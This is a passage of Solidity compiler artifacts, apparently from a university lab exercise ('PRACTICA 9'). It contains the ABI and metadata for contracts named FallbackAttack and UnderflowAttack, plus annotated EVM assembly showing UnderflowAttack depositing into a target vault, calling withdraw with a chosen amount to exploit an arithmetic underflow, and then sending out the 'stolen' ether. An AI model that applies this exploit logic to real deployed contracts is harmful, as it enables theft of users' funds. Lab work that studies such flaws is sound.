					"metadata": "{\"compiler\":{\"version\":\"0.6.4+commit.1dca32f3\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"at_contract\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawFunds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"PRACTICA 9/CryptoVault2.sol\":\"FallbackAttack\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"PRACTICA 9/CryptoVault2.sol\":{\"keccak256\":\"0xd47d0ccc73f25845eb52593e0e02f343d9ae0bdc04f9aeaac9d3895fd5cf5c65\",\"urls\":[\"bzz-raw://63d1cc1997da08857ae0a87ee61e0079573419566f3653b55f3e1014c9da055a\",\"dweb:/ipfs/QmTa6eRzByangAxzcA4PksJHpRdZsnD8HdMk1jin5rdH2o\"]},\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 242,
								"contract": "PRACTICA 9/CryptoVault2.sol:FallbackAttack",
								"label": "attackedContract",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"UnderflowAttack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "at_contract",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "cantidad",
									"type": "uint256"
								}
							],
							"name": "attack",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "deposit",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "withdrawStolenEther",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"PRACTICA 9/CryptoVault2.sol\":7813:8844  contract UnderflowAttack {\r... */\n  mstore(0x40, 0x80)\n    /* \"PRACTICA 9/CryptoVault2.sol\":7940:8062  constructor(address at_contract) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"PRACTICA 9/CryptoVault2.sol\":7940:8062  constructor(address at_contract) public {\r... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x20\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"PRACTICA 9/CryptoVault2.sol\":7940:8062  constructor(address at_contract) public {\r... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":8010:8021  at_contract */\n  dup1\n    /* \"PRACTICA 9/CryptoVault2.sol\":7991:8007  attackedContract */\n  0x00\n  dup1\n    /* \"PRACTICA 9/CryptoVault2.sol\":7991:8021  attackedContract = at_contract */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":7940:8062  constructor(address at_contract) public {\r... */\n  pop\n    /* \"PRACTICA 9/CryptoVault2.sol\":7813:8844  contract UnderflowAttack {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"PRACTICA 9/CryptoVault2.sol\":7813:8844  contract UnderflowAttack {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x24d8e86b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x64dd891a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xd0e30db0\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"PRACTICA 9/CryptoVault2.sol\":8699:8799  function withdrawStolenEther() external{\r... */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_8\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_8:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8699:8799  function withdrawStolenEther() external{\r... */\n      pop\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8383:8690  function attack(uint256 cantidad) external{\r... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_11\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_11:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8383:8690  function attack(uint256 cantidad) external{\r... */\n      pop\n      tag_12\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_13:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8383:8690  function attack(uint256 cantidad) external{\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_14\n      jump\t// in\n    tag_12:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8070:8375  function deposit() external payable {\r... */\n    tag_5:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      stop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8699:8799  function withdrawStolenEther() external{\r... */\n    tag_10:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8749:8759  msg.sender */\n      caller\n        /* \"PRACTICA 9/CryptoVault2.sol\":8749:8768  msg.sender.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":8749:8791  msg.sender.transfer(address(this).balance) */\n      0x08fc\n        /* \"PRACTICA 9/CryptoVault2.sol\":8769:8790  address(this).balance */\n      selfbalance\n        /* \"PRACTICA 9/CryptoVault2.sol\":8749:8791  msg.sender.transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_19\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_19:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8749:8791  msg.sender.transfer(address(this).balance) */\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8699:8799  function withdrawStolenEther() external{\r... */\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":8383:8690  function attack(uint256 cantidad) external{\r... */\n    tag_14:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8516:8528  bool success */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":8532:8548  attackedContract */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":8532:8553  attackedContract.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":8599:8607  cantidad */\n      dup3\n        /* \"PRACTICA 9/CryptoVault2.sol\":8554:8608  abi.encodeWithSignature(\"withdraw(uint256)\", cantidad) */\n      add(0x24, mload(0x40))\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"PRACTICA 9/CryptoVault2.sol\":8554:8608  abi.encodeWithSignature(\"withdraw(uint256)\", cantidad) */\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)\n        /* \"--CODEGEN--\":38:42   */\n      0x20\n        /* \"--CODEGEN--\":29:36   */\n      dup3\n        /* \"--CODEGEN--\":25:43   */\n      add\n        /* \"--CODEGEN--\":67:77   */\n      dup1\n        /* \"--CODEGEN--\":61:78   */\n      mload\n        /* \"--CODEGEN--\":96:154   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"--CODEGEN--\":199:207   */\n      dup4\n        /* \"--CODEGEN--\":192:196   */\n      dup2\n        /* \"--CODEGEN--\":186:190   */\n      dup4\n        /* \"--CODEGEN--\":182:197   */\n      and\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":167:177   */\n      dup4\n        /* \"--CODEGEN--\":160:209   */\n      mstore\n        /* \"--CODEGEN--\":0:215   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8554:8608  abi.encodeWithSignature(\"withdraw(uint256)\", cantidad) */\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8532:8609  attackedContract.call(abi.encodeWithSignature(\"withdraw(uint256)\", cantidad)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_21:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_21)\n    tag_23:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8532:8609  attackedContract.call(abi.encodeWithSignature(\"withdraw(uint256)\", cantidad)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_26\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_25)\n        /* \"--CODEGEN--\":14:41   */\n    tag_26:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_25:\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8515:8609  (bool success,)= attackedContract.call(abi.encodeWithSignature(\"withdraw(uint256)\", cantidad)) */\n      pop\n      swap1\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8628:8635  success */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":8620:8682  require(success, \"Encima de ladrón soy tonto y no se atacar\") */\n      tag_27\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x2a\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_653fda1be56379a9b0a26648001a0166e0a82c4c958abb08bd69df8fdced27c3\n      0x2a\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_27:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8383:8690  function attack(uint256 cantidad) external{\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"PRACTICA 9/CryptoVault2.sol\":8070:8375  function deposit() external payable {\r... */\n    tag_16:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8137:8140  100 */\n      0x64\n        /* \"PRACTICA 9/CryptoVault2.sol\":8125:8134  msg.value */\n      callvalue\n        /* \"PRACTICA 9/CryptoVault2.sol\":8125:8140  msg.value >=100 */\n      lt\n      iszero\n        /* \"PRACTICA 9/CryptoVault2.sol\":8117:8191  require(msg.value >=100, \"Has depositado una cantidad demasiado pequeña\") */\n      tag_29\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x2e\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_f371fbdb092f2395cc186dbc470c83e478621c58586470025de75a9dadaec15c\n      0x2e\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_29:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8205:8217  bool success */\n      0x00\n        /* \"PRACTICA 9/CryptoVault2.sol\":8221:8237  attackedContract */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":8221:8242  attackedContract.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"PRACTICA 9/CryptoVault2.sol\":8249:8258  msg.value */\n      callvalue\n        /* \"PRACTICA 9/CryptoVault2.sol\":8260:8296  abi.encodeWithSignature(\"deposit()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"PRACTICA 9/CryptoVault2.sol\":8260:8296  abi.encodeWithSignature(\"deposit()\") */\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0xd0e30db000000000000000000000000000000000000000000000000000000000)\n        /* \"--CODEGEN--\":38:42   */\n      0x20\n        /* \"--CODEGEN--\":29:36   */\n      dup3\n        /* \"--CODEGEN--\":25:43   */\n      add\n        /* \"--CODEGEN--\":67:77   */\n      dup1\n        /* \"--CODEGEN--\":61:78   */\n      mload\n        /* \"--CODEGEN--\":96:154   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"--CODEGEN--\":199:207   */\n      dup4\n        /* \"--CODEGEN--\":192:196   */\n      dup2\n        /* \"--CODEGEN--\":186:190   */\n      dup4\n        /* \"--CODEGEN--\":182:197   */\n      and\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":167:177   */\n      dup4\n        /* \"--CODEGEN--\":160:209   */\n      mstore\n        /* \"--CODEGEN--\":0:215   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8260:8296  abi.encodeWithSignature(\"deposit()\") */\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8221:8297  attackedContract.call{value:msg.value}(abi.encodeWithSignature(\"deposit()\")) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_30:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_32\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_30)\n    tag_32:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8221:8297  attackedContract.call{value:msg.value}(abi.encodeWithSignature(\"deposit()\")) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_35\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_34)\n        /* \"--CODEGEN--\":14:41   */\n    tag_35:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_34:\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8204:8297  (bool success, )=attackedContract.call{value:msg.value}(abi.encodeWithSignature(\"deposit()\")) */\n      pop\n      swap1\n      pop\n        /* \"PRACTICA 9/CryptoVault2.sol\":8316:8323  success */\n      dup1\n        /* \"PRACTICA 9/CryptoVault2.sol\":8308:8367  require(success, \"No habido exito a la hora de depositar.\") */\n      tag_36\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x27\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_2bd668f41fffb78302e8c697e28a55342028dddd51ffab0533d7565fd1f96173\n      0x27\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_36:\n        /* \"PRACTICA 9/CryptoVault2.sol\":8070:8375  function deposit() external payable {\r... */\n      pop\n      jump\t// out\n    stop\n    data_2bd668f41fffb78302e8c697e28a55342028dddd51ffab0533d7565fd1f96173 4e6f2068616269646f20657869746f2061206c6120686f7261206465206465706f73697461722e\n    data_653fda1be56379a9b0a26648001a0166e0a82c4c958abb08bd69df8fdced27c3 456e63696d61206465206c616472c3b36e20736f7920746f6e746f2079206e6f20736520617461636172\n    data_f371fbdb092f2395cc186dbc470c83e478621c58586470025de75a9dadaec15c 486173206465706f73697461646f20756e612063616e74696461642064656d61736961646f207065717565c3b161\n\n    auxdata: 0xa2646970667358221220b35da691a1c2d37c667fcd099efdb3e5f550fb23ab55e8c96d5ca43c2fb5f65264736f6c63430006040033\n}\n",
						"bytecode": {
							"linkReferences": {},
